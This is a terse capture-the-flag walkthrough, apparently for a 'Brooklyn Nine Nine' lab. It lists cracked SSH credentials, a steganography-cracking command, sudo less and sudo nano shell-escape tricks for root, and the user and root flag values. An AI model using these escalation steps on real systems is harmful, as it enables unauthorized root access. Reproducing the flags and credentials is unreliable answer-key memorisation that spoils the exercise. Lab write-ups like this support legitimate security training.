# Brooklyn Nine Nine-Bruteforce SSH service&sudo less privilege escalation&sudo nano privilege escalation

```
export IP=10.10.236.40
```

# Material needed

1. SSH credential 1

```
jake:987654321
```

2. Reverse engineering brooklyn99.jpg 

```
stegcracker brooklyn99.jpg 
``` 

3. SSH credential 2

```
holt:fluffydog12@ninenine
```

4. Privilege escalation 1 

```
sudo /usr/bin/less /etc/profile
!/bin/sh
```

5. Privilege escalation 2

```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

# Tasks

1. User flag

```
ee11cbb19052e40b07aac0ca060c23ee
```

2. Root flag

```
63a9f0ea7bb98050796b649e85481845
```